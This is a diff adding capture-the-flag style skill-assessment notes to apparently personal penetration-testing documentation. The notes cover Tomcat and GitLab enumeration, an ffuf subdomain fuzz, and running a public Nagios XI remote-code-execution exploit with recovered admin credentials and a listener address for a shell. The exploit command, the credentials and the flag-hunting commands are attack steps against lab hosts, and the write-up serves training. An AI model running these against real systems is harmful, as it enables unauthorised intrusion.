@@ -45,6 +45,9 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Attacking LDAP](#attacking-ldap)
     - [Web Mass Assignment Vulnerabilities](#web-mass-assignment-vulnerabilities)
 
+  - [Skill Assessments](#skill-assessments)
+    - [Skill Assessment 1](#skill-assessment-1)
+
 
 ---
 
@@ -2327,3 +2330,59 @@ The mass assignment vulnerability is successfully exploited.
 ![Filtered output](images/mass-assignment2.PNG)
 
 ---
+
+## Skill Assessments
+
+---
+
+### Skill Assessment 1
+
+Apache Tomcat 9 Version 9.0.0.M1
+
+CVE-2019-0232
+
+![Filtered output](images/skill1.PNG)
+
+### Skill Assessment 2
+
+Gitlab version 13.12.11
+
+User enumeration:
+
+![Filtered output](images/skill2.PNG)
+
+Access:
+
+```
+tester:Welcome1
+```
+
+Fuzz for subdomains:
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://gitlab.inlanefreight.local -H "Host: FUZZ.inlanefreight.local" -fs 46166
+```
+
+![Filtered output](images/skill2-2.PNG)
+
+  Exploit: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
+      URL: https://www.exploit-db.com/exploits/49422
+     Path: /usr/share/exploitdb/exploits/php/webapps/49422.py
+    Codes: CVE-2020-35578
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied EDB-ID #49422's path to the clipboard
+
+Found hardcoded username and password in gitlab `/explore`:
+
+```bash
+python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.15.11 1337
+```
+
+```bash
+find -name *flag.txt 2>/dev/null
+```
+
+```bash
+cat ./usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
+```
